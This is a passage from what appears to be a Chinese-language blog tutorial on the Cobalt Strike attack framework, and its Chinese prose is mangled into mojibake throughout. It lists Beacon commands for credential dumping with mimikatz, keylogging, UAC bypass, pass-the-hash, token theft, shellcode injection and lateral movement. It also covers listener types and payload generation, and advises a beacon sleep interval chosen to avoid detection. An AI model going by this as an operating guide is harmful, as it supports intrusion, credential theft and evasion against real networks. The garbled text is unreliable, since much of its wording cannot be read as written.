#æ–‡ä»¶æµè§ˆå™¨4Net View #å‘½ä»¤Net View5Port Scan #ç«¯å£æ‰«æ6Process List #è¿›ç¨‹åˆ—è¡¨7Screenshot #æˆªå›¾Pivoting1SOCKS Server #ä»£ç†æœåŠ¡2Listener #åå‘ç«¯å£è½¬å‘3Deploy VPN #éƒ¨ç½²VPNSpawnå¤–éƒ¨ç›‘å¬å™¨(å¦‚æŒ‡æ´¾ç»™MSFï¼Œè·å–meterpreteræƒé™)Session1Note #å¤‡æ³¨2Remove #åˆ é™¤3Sleep #æŒ‡å®šè¢«æ§ç«¯ä¼‘çœ æ—¶é—´ï¼Œé»˜è®¤60ç§’ä¸€æ¬¡å›ä¼ ï¼Œè®©è¢«æ§ç«¯æ¯10ç§’æ¥ä¸‹è½½ä¸€æ¬¡ä»»åŠ¡ã€‚å®é™…ä¸­é¢‘ç‡ä¸å®œè¿‡å¿«,å®¹æ˜“è¢«å‘ç°ã€‚4Exit #é€€å‡ºInteract(æ‰“å¼€beacon)1beacon&gt; help23Beacon Commands4===============56Command Description7------- -----------8argue è¿›ç¨‹å‚æ•°æ¬ºéª—9blockdlls é˜»æ­¢å­è¿›ç¨‹åŠ è½½éMicrosoft DLL10browserpivot æ³¨å…¥å—å®³è€…æµè§ˆå™¨è¿›ç¨‹11bypassuac ç»•è¿‡UACæå‡æƒé™12cancel å–æ¶ˆæ­£åœ¨è¿›è¡Œçš„ä¸‹è½½13cd åˆ‡æ¢ç›®å½•14checkin å¼ºåˆ¶è®©è¢«æ§ç«¯å›è¿ä¸€æ¬¡15clear æ¸…é™¤beaconå†…éƒ¨çš„ä»»åŠ¡é˜Ÿåˆ—16connect Connect to a Beacon peer over TCP17covertvpn éƒ¨ç½²Covert VPNå®¢æˆ·ç«¯18cp å¤åˆ¶æ–‡ä»¶19dcsync ä»DCä¸­æå–å¯†ç å“ˆå¸Œ20desktop è¿œç¨‹æ¡Œé¢(VNC)21dllinject åå°„DLLæ³¨å…¥è¿›ç¨‹22dllload ä½¿ç”¨LoadLibraryå°†DLLåŠ è½½åˆ°è¿›ç¨‹ä¸­23download ä¸‹è½½æ–‡ä»¶24downloads åˆ—å‡ºæ­£åœ¨è¿›è¡Œçš„æ–‡ä»¶ä¸‹è½½25drives åˆ—å‡ºç›®æ ‡ç›˜ç¬¦26elevate ä½¿ç”¨exp27execute åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(æ— è¾“å‡º)28execute-assembly åœ¨ç›®æ ‡ä¸Šå†…å­˜ä¸­æ‰§è¡Œæœ¬åœ°.NETç¨‹åº29exit ç»ˆæ­¢beaconä¼šè¯30getprivs Enable system privileges on current token31getsystem å°è¯•è·å–SYSTEMæƒé™32getuid è·å–ç”¨æˆ·ID33hashdump è½¬å‚¨å¯†ç å“ˆå¸Œå€¼34help å¸®åŠ©35inject åœ¨æ³¨å…¥è¿›ç¨‹ç”Ÿæˆä¼šè¯36jobkill ç»“æŸä¸€ä¸ªåå°ä»»åŠ¡37jobs åˆ—å‡ºåå°ä»»åŠ¡38kerberos_ccache_use ä»ccacheæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯39kerberos_ticket_purge æ¸…é™¤å½“å‰ä¼šè¯çš„ç¥¨æ®40kerberos_ticket_use Apply ä»ticketæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯41keylogger é”®ç›˜è®°å½•42kill ç»“æŸè¿›ç¨‹43link Connect to a Beacon peer over a named pipe44logonpasswords ä½¿ç”¨mimikatzè½¬å‚¨å‡­æ®å’Œå“ˆå¸Œå€¼45ls åˆ—å‡ºæ–‡ä»¶46make_token åˆ›å»ºä»¤ç‰Œä»¥ä¼ é€’å‡­æ®47mimikatz è¿è¡Œmimikatz48mkdir åˆ›å»ºä¸€ä¸ªç›®å½•49mode dns ä½¿ç”¨DNS Aä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon)50mode dns-txt ä½¿ç”¨DNS TXTä½œä¸ºé€šä¿¡é€šé“(ä»…é™D beacon)51mode dns6 ä½¿ç”¨DNS AAAAä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon)52mode http ä½¿ç”¨HTTPä½œä¸ºé€šä¿¡é€šé“53mv ç§»åŠ¨æ–‡ä»¶54net netå‘½ä»¤55note å¤‡æ³¨ 56portscan è¿›è¡Œç«¯å£æ‰«æ57powerpick é€šè¿‡Unmanaged PowerShellæ‰§è¡Œå‘½ä»¤58powershell é€šè¿‡powershell.exeæ‰§è¡Œå‘½ä»¤59powershell-import å¯¼å…¥powershellè„šæœ¬60ppid Set parent PID for spawned post-ex jobs61ps æ˜¾ç¤ºè¿›ç¨‹åˆ—è¡¨62psexec Use a service to spawn a session on a host63psexec_psh Use PowerShell to spawn a session on a host64psinject åœ¨ç‰¹å®šè¿›ç¨‹ä¸­æ‰§è¡ŒPowerShellå‘½ä»¤65pth ä½¿ç”¨Mimikatzè¿›è¡Œä¼ é€’å“ˆå¸Œ66pwd å½“å‰ç›®å½•ä½ç½®67reg Query the registry68rev2self æ¢å¤åŸå§‹ä»¤ç‰Œ69rm åˆ é™¤æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹70rportfwd ç«¯å£è½¬å‘71run åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(è¿”å›è¾“å‡º)72runas ä»¥å…¶ä»–ç”¨æˆ·æƒé™æ‰§è¡Œç¨‹åº73runasadmin åœ¨é«˜æƒé™ä¸‹æ‰§è¡Œç¨‹åº74runu Execute a program under another PID75screenshot å±å¹•æˆªå›¾76setenv è®¾ç½®ç¯å¢ƒå˜é‡77shell æ‰§è¡Œcmdå‘½ä»¤78shinject å°†shellcodeæ³¨å…¥è¿›ç¨‹79shspawn å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹å¹¶å°†shellcodeæ³¨å…¥å…¶ä¸­80sleep è®¾ç½®ç¡çœ å»¶è¿Ÿæ—¶é—´81socks å¯åŠ¨SOCKS4ä»£ç†82socks stop åœæ­¢SOCKS483spawn Spawn a session 84spawnas Spawn a session as another user85spawnto Set executable to spawn processes into86spawnu Spawn a session under another PID87ssh ä½¿ç”¨sshè¿æ¥è¿œç¨‹ä¸»æœº88ssh-key ä½¿ç”¨å¯†é’¥è¿æ¥è¿œç¨‹ä¸»æœº89steal_token ä»è¿›ç¨‹ä¸­çªƒå–ä»¤ç‰Œ90timestomp å°†ä¸€ä¸ªæ–‡ä»¶çš„æ—¶é—´æˆ³åº”ç”¨åˆ°å¦ä¸€ä¸ªæ–‡ä»¶91unlink Disconnect from parent Beacon92upload ä¸Šä¼ æ–‡ä»¶93wdigest ä½¿ç”¨mimikatzè½¬å‚¨æ˜æ–‡å‡­æ®94winrm ä½¿ç”¨WinRMæ¨ªå‘æ¸—é€95wmi ä½¿ç”¨WMIæ¨ªå‘æ¸—é€ä½¿ç”¨Listenersç®€ä»‹åœ¨æœ¬ç‰ˆæœ¬Cobalt Strike 3.14ä¸­ï¼Œæä¾›äº†å¦‚å›¾9ç§ Listener (ç›‘å¬å™¨)ã€‚1windows&#x2F;beacon_dns&#x2F;reverse_dns_txt2windows&#x2F;beacon_dns&#x2F;reverse_http3windows&#x2F;beacon_http&#x2F;reverse_http4windows&#x2F;beacon_https&#x2F;reverse_https5windows&#x2F;beacon_smb&#x2F;bind_pipe6windows&#x2F;beacon_tcp&#x2F;bind_tcp7windows&#x2F;foreign&#x2F;reverse_http8windows&#x2F;foreign&#x2F;reverse_https9windows&#x2F;foreign&#x2F;reverse_tcp (3.13ç‰ˆåå¢åŠ ï¼Œæ”¯æŒlinuxSSHä¼šè¯)beacon_xx ç³»åˆ—ä¸ºCobalt Strikeè‡ªèº«ï¼ŒåŒ…æ‹¬ dnsã€httpã€httpsã€smb å››ç§æ–¹å¼çš„ç›‘å¬å™¨ã€‚foreign ç³»åˆ—ä¸ºå¤–éƒ¨ç›‘å¬å™¨ï¼Œé€šå¸¸ä¸MSFæˆ–è€…Armitageè”åŠ¨ã€‚åœ¨Cobalt Strike 3.13ç‰ˆæœ¬åå¢åŠ äº†ä¸€ä¸ªæ–°çš„ Listeners (windows/beacon_tcp/bind_tcp) ï¼Œå®ƒæ”¯æŒlinuxSSHä¼šè¯ã€‚å…·ä½“æ›´æ–°å†…å®¹å¯ä»¥æŸ¥é˜… å®˜ç½‘ ã€‚åˆ›å»ºä¸€ä¸ªæœåŠ¡é¦–å…ˆé…ç½®ä¸€ä¸ªç›‘å¬å™¨é€‰æ‹© Attacks &gt; Packages &gt; Windows Executableä¸Šçº¿æˆåŠŸï¼Œåœ¨ Event Log å¤„å‡ºç°ä¸Šçº¿ä¿¡æ¯ã€‚Beaconå³é”®ç›®æ ‡interactæ¥ä½¿ç”¨Beaconï¼Œç”¨å®ƒæ¥æ‰§è¡Œå„ç§å‘½ä»¤ã€‚åœ¨Cobalt Strikeä¸­ï¼Œé»˜è®¤å¿ƒè·³ä¸º60sï¼Œæ‰§è¡Œå‘½ä»¤çš„å“åº”å¾ˆæ…¢ï¼Œåœ¨ä¸‹è½½æ–‡ä»¶æ—¶æ›´åŠ æ˜æ˜¾ï¼Œæ‰€ä»¥æ ¹æ®å®æˆ˜ç¯å¢ƒæŠŠæ—¶é—´é™ä½ï¼Œå»ºè®®ä¸è¦å¤ªå¿«ï¼Œå¦åˆ™æµé‡ä¼šç›¸å¯¹æ˜æ˜¾ï¼Œåœ¨è¿™é‡Œè®¾ç½®sleep 10ã€‚åŒæ—¶åœ¨beaconä¸­ï¼Œå¦‚æœæƒ³å¯¹ç›®æ ‡è¿›è¡Œå‘½ä»¤ç®¡ç†ï¼Œéœ€è¦åœ¨å‰é¢åŠ ä¸Šshellï¼Œå¦‚shell whoamiã€shell ipconfigç­‰ã€‚æ€»ç»“è¿™é‡Œåªæ˜¯ç®€å•æè¿°CobaltStrikeçš„ç”¨æ³•ï¼Œå…¶ä¸­è¿˜æœ‰å¾ˆå¤šåŠŸèƒ½çš„ä½¿ç”¨ï¼Œéœ€è¦å®é™…æ“ä½œä¸­å»å‘ç°ã€‚æ›´æ ¸å¿ƒçš„åœ°æ–¹åœ¨äºç†è§£CobaltStrikeçš„Beaconåœ¨å†…ç½‘ä¸­çš„é€šä¿¡è¿‡ç¨‹ï¼Œè¿™å¯¹äºæ¸—é€è€…èƒ½å¦æ›´è¿›ä¸€æ­¥æ·±å…¥å†…ç½‘èµ·åˆ°é‡è¦ä½œç”¨ï¼Œä¹Ÿæ˜¯ç¥å™¨çš„ä»·å€¼æ‰€åœ¨ã€‚åœ¨æ¸—é€è¿‡ç¨‹ä¸­ï¼Œä¸è¦ä»…é™äºå•ä¸€æ¨¡å¼çš„æ€è·¯ï¼Œæ ¹æ®å®é™…çš„æƒ…å†µï¼Œé€‰æ‹©æ›´ä¼˜çš„æ–¹æ³•æ¥è¿›è¡Œä¸‹ä¸€æ­¥çš„æ¸—é€æµ‹è¯•ã€‚","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]}]}